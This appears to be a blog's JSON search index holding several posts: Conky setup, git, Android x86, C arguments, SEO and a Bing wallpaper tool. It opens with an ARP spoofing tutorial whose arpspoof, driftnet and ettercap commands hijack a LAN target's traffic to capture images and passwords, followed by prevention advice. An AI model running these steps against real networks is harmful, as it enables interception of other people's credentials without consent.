    "date": "2021-02-11 00:00:00 +0900",
    





    
    "snippet": "Address Resolution Protocol (ARP)  Address Resolution Protocol (ARP) is a procedure for mapping a dynamic Internet Protocol address (IP  address) to a permanent physical machine address in a local ...",
    "content": "Address Resolution Protocol (ARP)  Address Resolution Protocol (ARP) is a procedure for mapping a dynamic Internet Protocol address (IP  address) to a permanent physical machine address in a local area network (LAN). The physical machine address is also known as a Media Access  Control or MAC address.How ARP works?When a new device is joined into a LAN,  it is assigned a unique IP address to use for identification and communication. When an incoming packet destined for a host machine on a particular LAN arrives at a gateway, the gateway asks the ARP program to find a MAC address that matches the IP address. A table called the ARP cache maintains a record of each IP  address and its corresponding MAC address.If the MAC address is not present in the ARP cache table then the source device will generate an ARP Request message. In the request message the source puts its own MAC address,  its IP address, destination IP address and the destination MAC address  is left blank since the source is trying to find this.In generally,  Address Resolution Protocol is used to obtain the MAC address of the destination host based on its IP address. It converts the IP address of the target host into a MAC address before sending a frame.Types of ARP SpoofingThere are two types of ARP Spoofing:      For instance, there are three hosts A, B and C. A wants to communicate with B, when A asks C that whether he is B, C shamelessly says yes. So packages that A should have sent to B are sent to C.        Still that example, A wants to communicate with B, this time A asks that who is B, C shamelessly says again. So, A sends  packages to C, then C says to B: “I am A” and send the package to him.  What can we do?  Disconnect other devices’ network connections  Hijack the traffic of other devices and gateways in the LAN to obtain sensitive information like password, browsing images and so onARP Spoofing TutorialFirst of all, host and target must be in a same LAN, of course.#0. Environment  Parrot OS(You can also use Kali Linux)  Wireless Network Card to connect to the WiFi.#1. Get local IPOpen a terminal:sudo ifconfigorsudo ip addr show#2. Scan target’s IPUsually we use Nmap to scan target’s IP:sudo nmap -sP 192.168.1.1/24(192.168.1.1 is the default gateway address, it depends your router.)Another easy way is use Zenmap, it’s an official GUI version of Nmap. It is a multi-platform (Linux, Windows, Mac OS X, BSD, etc.) free and open source application which aims to make Nmap easy for beginners to use.The easiest way is – if you have already logged in the 192.168.1.1 – sometimes admin as username and admin as password – you see, quite easy.#3. Disconnect target’s connectionsUse arpspoofsudo arpspoof [-i interface] [-t target_ip] &lt;host_ip&gt;  interface: Your wireless interface(ifconfig to get)  target: Target’s IP address  host: Your IP address.Because the attacker did not enable port forwarding, the request could not be released, and the target’s network was disconnected. So if we enable port forwarding, we can hijack target’s traffic.#4. Hijack target’s trafficEnable port forwarding:sudo echo 1 &gt; /proc/sys/net/ipv4/ip_forwardThen we use arpspoof like this:sudo arpspoof [-i interface] &lt;host_ip&gt; &lt;target_ip&gt;Because the target machine is connected to WiFi, when performing ARP Spoofing, you need to change the order with the target machine. If you don’t change it, you can see that the MAC address of the gateway is the same as the MAC address of the attacking machine during ARP Spoofing, so that the target machine cannot communicate normally.Use driftnet to get imagesAfter hijacking the traffic successfully, we can save income images from target with driftnet(HTTP only).sudo driftnet [-i interface]Moreover,sudo driftnet [-d directory] [-i interface]to set directory that images will be saved.Use Ettercap to get passwordssudo ettercap -Tq [-i interface]  -T: Text mode  -q: Quiet modeAlso, you can use Wireshark, it has a user-friendly GUI and easier for beginners.How to prevent ARP Spoofing?To be honest, it’s not hard to prevent ARP Spoofing, but many people don’t do like that.#1. Rely on Virtual Private Networks(VPN)One way to prevent ARP spoofing from happening in the first place is  to rely on Virtual Private Networks(VPN). When you connect to the internet, you typically first connect to an Internet Service Provider(ISP) in order to connect to another website. However, when you use a VPN, you’re using an encrypted tunnel that largely blocks your activity from ARP spoofing hackers. Both the method by which you’re conducting the online activity and the data that goes through it is encrypted.Moreover, you should consider a VPN if you travel frequently or use public WiFi  hotspots while working with sensitive information or data. You could also consider using a mobile internet device that could help reduce the chances of someone working their way into your system through public WiFi with no login or password requirements. Although VPN can be a safer way to use the internet, it can sometimes slow down your online access due to the encrypting and decrypting processing power.#2.Get a Detection ToolEven with ARP knowledge and techniques in place, it’s not always possible to detect a spoofing attack. Hackers are becoming increasingly stealthy at remaining undetected and use new technologies and tools to stay ahead  of their victims. Instead of strictly focusing on prevention, make sure  you have a detection method in place. Using a third-party detection tool can help you see when a spoofing attack is happening so you can work on stopping it in its tracks.A third-party tool like XArp can help detect if you are being attacked by ARP spoofing. However, that’s just the first step to ARP spoofing protection. In addition to using the right tools, you should also consider a robust monitoring tool or service.Some third-party tools:  Arpwatch: If the cross-platform open-source tool Arpwatch is integrated into a  local IPv4 network, it continuously records all ARP activities in the  LAN. All inbound ARP packets are taken by the program along with  accompanying address information and stored in a central database. If  older entries are found that don’t match the data currently being sent,  the program sends an email warning to the administrator. The procedure  is effective, but is only suitable for networks with static IP  addresses. If LAN IPs are distributed dynamically over a DHCP server,  any change in the IP/MAC mapping results in a false alarm.  ARP-Guard: ARP-Guard from the company ISL also monitors the internal network and relies on two different sensors. The LAN sensor works similarly to Arpwatch, analyzing inbound data packets and sounding an alarm in case of any discrepancies. The sensor management architecture of the software also has an SNMP sensor, which uses the Simple Network Management Protocol(SNMP) to access devices connected to the LAN and read out their ARP tables. In this way, not only are ARP attacks localized and warded off; the integrated address management also allows administrators to detect unwanted devices and prevent them from accessing the network.  XArp: The XArp software relies on both active and passive modules to protect a network from ARP spoofing. The passive modules analyze ARP packets that are sent on the network, and match the accompanying address assignment with older entries. If discrepancies are noticed, the program alarm sounds. The control mechanism is based on statistical analyses and checks the network traffic on the basis on of various patterns which, according to developers, indicate ARP attacks. The sensitivity of this traffic filter can be adjusted gradually. The active modules of the software send their own packets into the network, in order to validate the ARP tables of the accessible devices and to fill them with valid entries.#3.MAC Address BindingBinding MAC address is the easiest way the prevent ARP Spoofing, in Linux, just use:sudo arp -s &lt;ip&gt; &lt;mac&gt; #Bind MAC addresssudo arp -d &lt;ip&gt; &lt;mac&gt; #Disbing MAC address  ip: Your IP address  mac: Your MAC addressIn Windows, open cmd:arp -s &lt;ip&gt; &lt;mac&gt; #temporaryornetsh i i show in #show Idxnetsh -c i i add ne &lt;Idx&gt; &lt;ip&gt; &lt;mac&gt; store=active #temporarynetsh -c i i add ne &lt;Idx&gt; &lt;ip&gt; &lt;mac&gt;netsh -c i i del ne &lt;Idx&gt; #Disbing MAC address(Some routers have functions to bind MAC address too.)"
  },
  
  {
    "title": "Fix Syntax Error conky syntax update",
    "url": "/posts/new-conky/",
    "categories": "Linux",
    "tags": "Linux, Beautify",
    "date": "2021-01-29 00:00:00 +0900",
    





    
    "snippet": "Features(Github)Conky can display more than 300 built-in objects, including support for:  A plethora of OS stats (uname, uptime, CPU usage, mem usage, disk usage, “top” like process stats, and netw...",
    "content": "Features(Github)Conky can display more than 300 built-in objects, including support for:  A plethora of OS stats (uname, uptime, CPU usage, mem usage, disk usage, “top” like process stats, and network monitoring, just to name a few).  Built-in IMAP and POP3 support.  Built-in support for many popular music players (MPD, XMMS2, Audacious).  Can be extended using built-in Lua support, or any of your own scripts and programs (more).  Built-in Imlib2 and Cairo bindings for arbitrary drawing with Lua (more).  Runs on Linux, FreeBSD, OpenBSD, DragonFlyBSD, NetBSD, Solaris, Haiku, and macOS!… and much much more.Conky can display information either as text, or using simple progress bars and graph widgets, with different fonts and colours.Syntax​\tAfter upgrade the whole system, I found conky doesn’t work well, the terminal pops out syntax error when running conky. Yes, the syntax changed, I have to rewrite the .conkyrc.​\tBefore updating, conky’s syntax is easy, very easy to understand, now, it’s more like… eh… TOML? I don’t know, but as a programmer, a geek, the new syntax seems better to adapt to.​\tSo, let’s take a look at the newest demos:--[[Conky, a system monitor, based on torsmoAny original torsmo code is licensed under the BSD licenseAll code written since the fork of torsmo is licensed under the GPLPlease see COPYING for detailsCopyright (c) 2004, Hannu Saransaari and Lauri HakkarainenCopyright (c) 2005-2019 Brenden Matthews, Philip Kovacs, et. al. (see AUTHORS)All rights reserved.This program is free software: you can redistribute it and/or modifyit under the terms of the GNU General Public License as published bythe Free Software Foundation, either version 3 of the License, or(at your option) any later version.This program is distributed in the hope that it will be useful,but WITHOUT ANY WARRANTY; without even the implied warranty ofMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See theGNU General Public License for more details.You should have received a copy of the GNU General Public Licensealong with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.]]conky.config = {    alignment = 'top_left',    background = false,    border_width = 1,    cpu_avg_samples = 2,    default_color = 'white',    default_outline_color = 'white',    default_shade_color = 'white',    double_buffer = true,    draw_borders = false,    draw_graph_borders = true,    draw_outline = false,    draw_shades = false,    extra_newline = false,    font = 'DejaVu Sans Mono:size=12',    gap_x = 60,    gap_y = 60,    minimum_height = 5,    minimum_width = 5,    net_avg_samples = 2,    no_buffers = true,    out_to_console = false,    out_to_ncurses = false,    out_to_stderr = false,    out_to_x = true,    own_window = true,    own_window_class = 'Conky',    own_window_type = 'desktop',    show_graph_range = false,    show_graph_scale = false,    stippled_borders = 0,    update_interval = 1.0,    uppercase = false,    use_spacer = 'none',    use_xft = true,}conky.text = [[${color grey}Info:$color ${scroll 32 Conky $conky_version - $sysname $nodename $kernel $machine}$hr${color grey}Uptime:$color $uptime${color grey}Frequency (in MHz):$color $freq${color grey}Frequency (in GHz):$color $freq_g${color grey}RAM Usage:$color $mem/$memmax - $memperc% ${membar 4}${color grey}Swap Usage:$color $swap/$swapmax - $swapperc% ${swapbar 4}${color grey}CPU Usage:$color $cpu% ${cpubar 4}${color grey}Processes:$color $processes  ${color grey}Running:$color $running_processes$hr${color grey}File systems: / $color${fs_used /}/${fs_size /} ${fs_bar 6 /}${color grey}Networking:Up:$color ${upspeed} ${color grey} - Down:$color ${downspeed}$hr${color grey}Name              PID     CPU%   MEM%${color lightgrey} ${top name 1} ${top pid 1} ${top cpu 1} ${top mem 1}${color lightgrey} ${top name 2} ${top pid 2} ${top cpu 2} ${top mem 2}${color lightgrey} ${top name 3} ${top pid 3} ${top cpu 3} ${top mem 3}${color lightgrey} ${top name 4} ${top pid 4} ${top cpu 4} ${top mem 4}]]​\tIt looks like this:​\tYes, inside the --[[and ]] is the comments. conky.config = { marks the beginning of the config part and } means the end.different types of variable such as “number”, characters('char'), boolean(true &amp; false) will be assigned to the properties which is to the left of the equal sign, just like most program languages. Of course, inside conky.text = [[ and ]], you could customize your conky’s appearance and looks, you don’t need to change a lot even though syntax updated.More – Wiki​\tMore options and tutorial here: Conky Wiki(Github)."
  },
  
  {
    "title": "Conky - Awesome system monitor for Linux",
    "url": "/posts/conky/",
    "categories": "Linux",
    "tags": "Linux, Beautify",
    "date": "2021-01-15 00:00:00 +0900",
    





    
    "snippet": "About Conky…  Conky is a free software desktop system monitor for the X Window System. It is available for Linux, FreeBSD, and OpenBSD. Conky is highly configurable and is able to monitor many syst...",
    "content": "About Conky…  Conky is a free software desktop system monitor for the X Window System. It is available for Linux, FreeBSD, and OpenBSD. Conky is highly configurable and is able to monitor many system variables including the status of the CPU, memory, swap space (what is swap space?), disk storage, temperatures, processes, network interfaces, battery power, system messages, e-mail inboxes, Arch Linux updates, many popular music players, weather updates, breaking news, and much more. Unlike system monitors that use high-level widget toolkits to render their information, Conky is drawn directly in an X window.  This allows it to be configured such that it consumes relatively few  system resources.​\tAre you getting bored with your dull backgrounds? Let’s use conky to improve that.Common uses​\tIf you’re using Pinguy OS or CrunchBang Linux(…). Conky is pre-configured in the default installation, but I think most of users are using Debian, Ubuntu, Fedora and so on. Conky is not installed by default in these systems. We should install conky first.Get conky  Open up a terminal window  Type following command and your sudo password$ sudo apt-get install conky-all  When prompted, accepted the installation by typing yConfigure a theme​\tWhat conky does is read the /etc/conky/conky.config file (when no ~/.conkyrc file is present) and display as you set. So there are tow solutions to have a good looking conky: either you modify the configure file on your own or you download a conky theme from the Internet and use it directly. There are many websites which could provide with plenty of awesome conky themes:  Deviant Art  Open Desktop​\tUsing these conky themes is similar to installing source code. A good conky theme will come with a README that  tells you what to change in the conky theme files and other important  things about using the conky theme. Most of the time you have to change  the path to image files or Lua script.Launch conky​\tIt’s easy to launch conky:$ conkyUsage example​\tA simple configuration for Conky which displays the time on a user’s desktop is as follows:update_interval 30own_window yesown_window_type desktopuse_xft yesxftfont DejaVu Sans:size=14alignment bottom_rightTEXT${time %H:%M}​\tHere’s my .conkyrc:# set to yes if you want Conky to be forked in the backgroundbackground nocpu_avg_samples 2net_avg_samples 2out_to_console no# X font when Xft is disabled, you can pick one with program xfontsel#font 7x12#font 6x10#font 7x13#font 8x13#font 7x12#font *mintsmild.se*#font -*-*-*-*-*-*-34-*-*-*-*-*-*-*#font -artwiz-snap-normal-r-normal-*-*-100-*-*-p-*-iso8859-1# Use Xft?use_xft yes# Xft font when Xft is enabledxftfont Sans:size=11  own_window_argb_visual yes#own_window_colour hotpink# Text alpha when using Xftxftalpha 0.8# on_bottom yes# mail spool# mail_spool $MAIL# Update interval in secondsupdate_interval 1# Create own window instead of using desktop (required in nautilus)own_window yesown_window_transparent yesown_window_hints undecorated,below,sticky,skip_taskbar,skip_pager#own_window_type overrideown_window_type dock# Use double buffering (reduces flicker, may not work for everyone)double_buffer yes# Minimum size of text areaminimum_size 260 5maximum_width 400# Draw shades?draw_shades no# Draw outlines?draw_outline no# Draw borders around textdraw_borders no# Stippled borders?stippled_borders no# border margins# border_margin 4# border widthborder_width 1# Default colors and also border colorsdefault_color whitedefault_shade_color whitedefault_outline_color white# Text alignment, other possible values are commented#alignment top_left#minimum_size 10 10gap_x 10gap_y 35alignment top_right#alignment bottom_left#alignment bottom_right# Gap between borders of screen and text# Add spaces to keep things from moving about?  This only affects# certain objects.use_spacer none# Subtract file system buffers from used memory?no_buffers yes# set to yes if you want all text to be in uppercaseuppercase no# none, xmms, bmp, audacious, infopipe (default is none)# xmms_player bmpTEXT${color #006400}SYSTEM ${hr 1}#Time:$alignr${time %Y.%m.%d}$alignc   ${time %H:%M:%S}$alignr   Week:${time %w}Hostname:                Parrot SecurityKernel: $alignr$kernelMachine:$alignr$machineTemp: ${alignr}${exec sensors | grep 'Core 0' | cut -c17-22}C###############${color #FF8C00}MEMORY ${hr 1}Ram ${alignr}$mem / $memmax ($memperc%)${membar 4}Highest MEM $alignr MEM%${top_mem name 1}$alignr ${top_mem mem 1}${top_mem name 2}$alignr ${top_mem mem 2}${top_mem name 3}$alignr ${top_mem mem 3}##############${color #BC8F8F}CPU ${hr 1}Frequency: ${alignr}${freq dyn} MHzProcesses: ${alignr}$processes ($running_processes running)Load: ${alignr}$loadavgCPU1 ${alignr}${cpu cpu1}%${cpubar 4 cpu1}CPU2 ${alignr}${cpu cpu2}%${cpubar 4 cpu2}Highest CPU $alignr CPU%${top name 1}$alignr${top cpu 1}${top name 2}$alignr${top cpu 2}${top name 3}$alignr${top cpu 3}##############${color #228B22}FILE SYSTEM ${hr 1}Root: ${alignr}${fs_free /} / ${fs_size /}${fs_bar 4 /}#############${color white}ETHERNET ${hr 1}${color}Down ${downspeed eth0} /s ${alignr}Up ${upspeed eth0} /s${downspeedgraph eth0 25,107} ${alignr}${upspeedgraph eth0 25,107}Total ${totaldown eth0} ${alignr}Total ${totalup eth0}#############${color white}WLAN ${hr 1}${color}Down ${downspeed wlx48022a54bc53} /s ${alignr}Up ${upspeed wlx48022a54bc53} /s${downspeedgraph wlx48022a54bc53 25,107} ${alignr}${upspeedgraph wlx48022a54bc53 25,107}Total ${totaldown wlx48022a54bc53} ${alignr}Total ${totalup wlx48022a54bc53}#############​\tIt looks like this:​\tYou can download here: .conkyrcConfigure with GUI[Beginner]​\tConky Manager is a friendly GUI tool developed to use conky easier.​\tUse the following commands in terminal to install Conky Manager:$ sudo add-apt-repository ppa:teejee2008/ppa$ sudo apt-get update$ sudo apt-get install conky-manager​\tLaunch the Conky Manager and have fun!Advanced Usage &amp; IssuesStart conky automatically​\tYou can write a shell script to start conky automatically:#!/bin/shecho ’ ’ | sudo -S pm-powersavesleep 3conky &amp; disownsleep 30pkill run.sh​\tThen add it to startup applications list.Conky disappears…​\tIf conky disappears on clicking desktop in desktop environments like Mate, Gnome and so on, this may help you:​\tchange own_window_type desktop to:own_window_type dock​\tOr you will prefer to hidden desktop icons, the conky won’t disappear either(but of course you can’t see desktop icons)."
  },
  
  {
    "title": "Delete single file or folder from a Github repository",
    "url": "/posts/githubrm/",
    "categories": "Github",
    "tags": "Github",
    "date": "2021-01-02 00:00:00 +0900",
    





    
    "snippet": "  Sometimes we need to delete single file or folder in a git respository.​\tFirst of all, we use Git Bash in Windows (or Terminal in Linux, OSX).Clone Repository$ git clone https://xxxx/xxx/Remove l...",
    "content": "  Sometimes we need to delete single file or folder in a git respository.​\tFirst of all, we use Git Bash in Windows (or Terminal in Linux, OSX).Clone Repository$ git clone https://xxxx/xxx/Remove local file &amp; folder$ cd xxx/$ git rm file.file\t#remove single file$ git rm -r folder/\t#remove folderCommit$ git commit -m \"remove some files\"Push$ git push origin xxxx\t#xxxx is your branch"
  },
  
  {
    "title": "Install Android x86 in VMware and Virtualbox",
    "url": "/posts/androidx86/",
    "categories": "Linux",
    "tags": "Linux",
    "date": "2021-01-01 00:00:00 +0900",
    





    
    "snippet": "  What’s Android x86?  First, get Android x86  Installation  Finally &amp; Setup Android x86  Moreover…What’s Android x86?  ​\tAndroid-x86 is an open source project licensed under Apache Public Lice...",
    "content": "  What’s Android x86?  First, get Android x86  Installation  Finally &amp; Setup Android x86  Moreover…What’s Android x86?  ​\tAndroid-x86 is an open source project licensed under Apache Public License 2.0 that makes an unofficial  porting of Google’s Android mobile operating system to run on devices  powered by AMD and Intel x86 processors, rather than RISC-based ARM chips. Developers Chih-Wei Huang and Yi Sun originated the project in 2009.​\tPlatform:  Linux (Windows, OSX is also suitable for this article)  VMware 15 (Virtualbox is also suitable)  Android x86 (Here I use Android-x86 6.0)First, get Android x86​\tFirst, we need an image to install Android x86. I suggest downloading from the official website: https://www.android-x86.org/.Installation  Create a new virtual machine.  Use the ISO image that you downloaded from the website.  Give it a name?  We need at least 2GB memory to run Android x86.  Create virtual disk, I recommend 40GB and more.  Now, let’s start the vm  Choose Installation - Install Android-x86 to harddisk   Do not use GPT!!! 😭  Create new partition  Set Primary.  Set Bootable.  Write partition table to disk.  Enter “yes” to write.  Quit cfdisk.  Select the partition.  Format as ext4 (recommend)  Install boot loader.  Install /system as read-write.  Installing…--- A few moments later ---  Reboot (better not choose Run Android-x86).  Here’s the Grub!!! Boot Android-x86 6.0-r3!!!​\tBut…, oops!  All right, maybe we should configure this system further. The solution is editing the grub in Debug mode.  After enter the command line, firstly it needs to remount /mnt as rw.  Use vim to edit the /mnt/grub/menu.lst.  Add nomodeset after quiet like this:  Save &amp; RebootFinally &amp; Setup Android x86​\tSuccessfully boot Android x86!!!  Set date &amp; time.  Your beautiful name:  Complete!!!Moreover…  If installed applications crashes easily, please run enable_houdini in terminal.  Have fun!!!"
  },
  
  {
    "title": "C Tutorial -- Command Line Arguments",
    "url": "/posts/C-Tutorial-arg/",
    "categories": "C/C++",
    "tags": "C/C++, Linux",
    "date": "2020-12-26 00:00:00 +0900",
    





    
    "snippet": "What is Command Line Arguments​\tWhen executing the program, you can pass values to the C program from the command line. These values are called command line arguments, and they are important to the...",
    "content": "What is Command Line Arguments​\tWhen executing the program, you can pass values to the C program from the command line. These values are called command line arguments, and they are important to the program, especially when you want to control the program from the outside, rather than hard-coding these values in the code. Even all the program in Linux will provide command line arguments.Use Command Line Arguments​\tCommand line arguments are handled using main() function arguments, where argc refers to the number of arguments passed in, and argv[] is an pointer array which point to each argument passed to the program. The following is a simple example:#include &lt;stdio.h&gt;int main( int argc, char *argv[] )  {   if( argc == 2 )   {      printf(\"The argument supplied is %s\\n\", argv[1]);   }   else if( argc &gt; 2 )   {      printf(\"Too many arguments.\\n\");   }   else   {      printf(\"No argument.\\n\");   }}​\tIt produces the following result:  No argument$./a.outNo argument.  Single argument$./a.out aaarrrgggThe argument supplied is aaarrrggg  Two arguments &amp; Above$./a.out arg1 arg2Too many arguments.Explanation — argv[0], argv[1]…​\tYou should know that argv[0] holds the name of the program itself and argv[1]  is a pointer to the first command line argument supplied, and *argv[n]  is the last argument. If no arguments are supplied, argc will be 1,  and if you pass one argument then argc is set at 2.​\tYou pass all the command line arguments separated by a space, but if  argument itself has a space then you can pass such arguments by putting  them inside double quotes \" \" or single quotes ' '.  So, let’s try this:$./a.out \"arg1 arg2\"The argument supplied is aaarrrggggetopt() &amp; getopt_long()​\tIn Linux, we can use getopt() and getopt_long() to pass arguments:#include&lt;stdio.h&gt;int main(int argc, char *argv[]){    char *optstr = \"p:n:m:c:\";    struct option opts[] = {        {\"path\", 1, NULL, 'p'},        {\"name\", 1, NULL, 'n'},        {\"mtime\", 1, NULL, 'm'},        {\"ctime\", 1, NULL, 'c'},        {0, 0, 0, 0},    };    int opt;    while((opt = getopt_long(argc, argv, optstr, opts, NULL)) != -1){        switch(opt) {            case 'p':                strcpy(path, optarg);                break;            case 'n':                strcpy(targetname, optarg);                break;            case 'm':                modifiedtime = atoi(optarg);                break;            case 'c':                changetime = atoi(optarg);                break;            default:                if(strchr(optstr, optopt) == NULL){                    fprintf(stderr, \"unknown option '-%c'\\n\", optopt);                }else{                    fprintf(stderr, \"option requires an argument '-%c'\\n\", optopt);                }                return 1;        }    }    findInDir(path);    return 0;}"
  },
  
  {
    "title": "Beginner's Guide to Search Engine Optimization (SEO)",
    "url": "/posts/seo/",
    "categories": "Blogging",
    "tags": "Blogging, Hexo, SEO",
    "date": "2020-12-25 00:00:00 +0900",
    





    
    "snippet": "What’s SEO​\tAn SEO (“Search Engine Optimization”) expert is someone trained to improve your visibility on search engines. So, it’s important to learn about SEO.Title​\tWhat is a page title? This is ...",
    "content": "What’s SEO​\tAn SEO (“Search Engine Optimization”) expert is someone trained to improve your visibility on search engines. So, it’s important to learn about SEO.Title​\tWhat is a page title? This is the HTML title tag, which we also call the page title. The page title is the most influential place to have your keyword phrase. Must make sure a title is good enough. Here are some recommendations for you:  Length: Between 50 - 60 characters, make it “simple”, remember do not make it too long.  DO NOT overdo keywords in title like: “Title TITLE title…”. That’s really not a good idea…  Unique title: don’t use same titles… You know…                              Separate keywords with “ - “, “ **          ** “…                    Keywords Tag​\tYou can put keywords into a keywords tag in &lt;head&gt;&lt;/head&gt; like this:&lt;head&gt;\t&lt;meta name=\"keywords\" content=\"Keywords, blog, SEO\"&gt;&lt;/head&gt;ALSO:  DO NOT overdo keywords!!!Descriptions Tag​\tA description tag contains the… description😅. All right, search engines may use the description provided in the description tag in the search engine results page (SERP). A well-written description that pertains to the content of the  page and that is relevant to the searcher’s intent can help you increase traffic since it can help improve the click-through rate of your page  in search. Add a description to the &lt;head&gt;&lt;/head&gt; section of the page source:&lt;head&gt;\t&lt;meta name='description' content='Descriptive, Now we talk about the basics of Search Engine Optimization.'&gt;&lt;/head&gt;Heading Tag​\tHeading is the collective name for the 6 tags: h1, h2, h3, h4, h5, and h6. The weights of the 6 tags are from big to small, that is, h1 is the big heading, h6 is the smallest heading:&lt;h1&gt;Heading 1&lt;/h1&gt;​\tThe h1 tag can only be used once. If it is used multiple times, it is easy to be regarded as cheating by search engines.No follow​\tThe nofollow tag tells search engines to ignore that link. Because  nofollow links do not pass PageRank they likely don’t impact search  engine rankings. Nofollow links are links with a rel=”nofollow” HTML tag applied to them:&lt;a href = \"https://theodorecooper.github.io/\" rel = \"nofollow\"&gt;Sitemap  ​\tA sitemap is a file where you provide information about the  pages, videos, and other files on your site, and the relationships  between them. Search engines like Google read this file to more  intelligently crawl your site. A sitemap tells Google which pages and  files you think are important in your site, and also provides valuable  information about these files: for example, for pages, when the page was last updated, how often the page is changed, and any alternate language versions of a page.Sitemaps (XML) look like this:&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\"&gt;\t&lt;url&gt;\t\t&lt;loc&gt;https://theodorecooper.github.io/&lt;/loc&gt;\t\t&lt;lastmod&gt;2020-10-31T16:12:20+03:00&lt;/lastmod&gt;\t&lt;/url&gt;&lt;/urlset&gt;​\tOf course, there are HTML sitemaps, even TXT sitemaps…How to get a sitemap?  Write it yourself (if you are a complete fool)  Use plugins (like Yoast…)  Use sitemap generators:          XML - Sitemaps      My Sitemap Generator      …      robots.txt  ​\tA robots.txt file tells search engine crawlers which pages or files the crawler can or            can’t request from your site. This is used mainly to avoid overloading your site with            requests.robots.txt looks like this:User-agent: *Allow: /Allow: /archives/Allow: /categories/Allow: /tags/ Allow: /resources/ Disallow: /vendors/Disallow: /js/Disallow: /css/Disallow: /fonts/Disallow: /vendors/Sitemap: ...​\tThe value of Allow is the content that allows search engines to crawl the area.Link structure​\tThe distance between the home page and other pages cannot be too large, it means: keep your URL short.​\tDO NOThttps://theodorecooper.github.io/blog/2020/12/25/seo/index.html​\tDOhttps://theodorecooper.github.io/2020/seo/index.html​\tIn a word: SIMPLE.Image ALT​\tWhen inserting a picture, you will be prompted to enter text. The keywords appearing in the image ALT also have a certain impact on page relevance. Similarly, DO NOT overdo keywords!!!More…  Google Search Console  Bing Webmaster Tools  Google Analytics  Do not use hack tools…  Be patient!  Think carefully!"
  },
  
  {
    "title": "Hexo - Speed up",
    "url": "/posts/hexo-speed-up/",
    "categories": "Blogging",
    "tags": "Blogging, Hexo",
    "date": "2020-12-18 00:00:00 +0900",
    





    
    "snippet": "use plugins      Compress HTML code:    npm install hexo-html-minifier --save            Compress JavaScript code:    npm install hexo-uglify --save            Compress CSS code:    npm install hex...",
    "content": "use plugins      Compress HTML code:    npm install hexo-html-minifier --save            Compress JavaScript code:    npm install hexo-uglify --save            Compress CSS code:    npm install hexo-clean-css --save      ## result…"
  },
  
  {
    "title": "Linux, C | Bing Backgrounds Getter",
    "url": "/posts/linux-bingbg/",
    "categories": "C/C++",
    "tags": "C/C++, Linux",
    "date": "2020-11-29 00:00:00 +0900",
    





    
    "snippet": "Linux, Bing…​\tIt’s a program written by C, it will automatically download and set wallpaper for you on Linux!How does it works​\tIt will download a XML file contains the API of www.bing.com, and the...",
    "content": "Linux, Bing…​\tIt’s a program written by C, it will automatically download and set wallpaper for you on Linux!How does it works​\tIt will download a XML file contains the API of www.bing.com, and then, I parse the file to obtain the full URL-path of the daily wallpaper. Finally, the wallpaper will be download and set as the background.DetailsDevelopment environment:      Linux 5.7.0\tamd64\tx86_64        MATE 1.24.0        gcc version 9.3.0 (Debian 9.3.0-15)        curl 7.72.0 (x86_64-pc-linux-gnu)        libxml2        vim  ​\tSo, how Linux download files with C? There’s no URLDownloadToFile(), but we have a stronger tool – curl. After installing the libcurl package for C, we can use it to download the files.Install libcurl:  $ sudo apt-get update   $ sudo apt-get install curl   $ sudo apt-get install libcurl4-openssl-devDownload with curl:  /*  *#include &lt;curl/curl.h&gt;  *remember this!!!  */    curlXml = curl_easy_init();  if (curlXml)  {      fpXml = fopen(xmlName, \"wb\");      curl_easy_setopt(curlXml, CURLOPT_URL, xml_url);      curl_easy_setopt(curlXml, CURLOPT_WRITEFUNCTION, write_data);      curl_easy_setopt(curlXml, CURLOPT_WRITEDATA, fpXml);      curl_easy_setopt (curlXml, CURLOPT_NOPROGRESS, 0);        resXml = curl_easy_perform(curlXml);      curl_easy_cleanup(curlXml);      fclose(fpXml);  }​\tAfter it, another big problem, how to parse the XML? I tried tinyxml, but such foolish thing even can hardly be installed on my lovely Linux! Then I find another easier way, libxml. With the help of APT, I easily installed libxml, next I learned how to use it.Install libxml:  $ sudo apt-get install libxml2  $ sudo apt-get install libxml2-devHere’s the example:  /*  *#include &lt;libxml/tree.h&gt;  *#include &lt;libxml/parser.h&gt;  *remember this!!!  */    xmlDocPtr pdoc = NULL;  xmlNodePtr proot = NULL;  xmlNodePtr pcur = NULL;      xmlKeepBlanksDefault(0); //Blanks may be parse as a node  pdoc = xmlReadFile(xmlName, \"UTF-8\", XML_PARSE_RECOVER);    if (pdoc == NULL)  {      printf(RED\"ERROR:cannot open xml!!!\\n\");     \texit(1);  }    proot = xmlDocGetRootElement(pdoc);    if(proot == NULL)  {      printf(RED\"ERROR: Xml is empty!!!\\n\");     \texit(1);  }    pcur = proot -&gt; xmlChildrenNode;    while (pcur != NULL)  {      if (!xmlStrcmp(pcur-&gt;name, BAD_CAST(\"image\")))      {          xmlNodePtr nptr=pcur-&gt;xmlChildrenNode;        \twhile (pcur != NULL)        \t{              if (!xmlStrcmp(nptr-&gt;name, BAD_CAST(\"url\")))              {                 \t\turlPart = XML_GET_CONTENT(nptr-&gt;xmlChildrenNode);          \t\tprintf(\"URL part: %s\", urlPart);          \t\tbreak;              }          \tnptr = nptr -&gt; next;          }      }      pcur = pcur -&gt; next;  }    xmlFreeDoc(pdoc);  xmlCleanupParser();  xmlMemoryDump();  printf(\"&lt;Parse Done!!!&gt;\\n\");​\tcurl again!!! The wallpaper successfully downloaded!!!## Finally, how to set wallpapers…​\tI promise, I won’t let you set backgrounds like that, you won’t need to open your control center - Look and Feel - Appearance. We use gsettings.  gsettings set org.mate.background picture-filename picUri​\tGnome 3 is supported too:  gsettings set org.gnome.desktop.background picture-uri picUri### It support:  Gnome 3 test on latest Ubuntu (ubuntu-20.04.1-desktop-amd64)  MATE test on Debian 10  Xfce isn’t supported now  You can just store the wallpaper, if you don’t want to change your backgrounds## Source code      You can find the source code on my Github.        --- ~~Star &amp; Fork me~~ ---        Give me advice: ccooperr2005@gmail.com        Donate (Bitcoin) :    zpub6maNAHkLN2gfztxLDnKVjJASMk1Ra5DgdF2yGSTov7VXUn3Eijusyye89aKSwZWxrRas4QJnVtwXKEzdpKhTMSgiXF9RuK6AMm6w3V4jnMr    : )  ### Compile &amp; Build the code  $ git clone https://github.com/theodorecooper/Linux-Bing-Backgrounds-Getter.git  $ cd Linux-Bing-Backgrounds-Getter  $ make  $ ./bingbg"
  },
  
  {
    "title": "Windows, C++ - Bing Backgrounds Getter",
    "url": "/posts/bing-backgrounds/",
    "categories": "Qt",
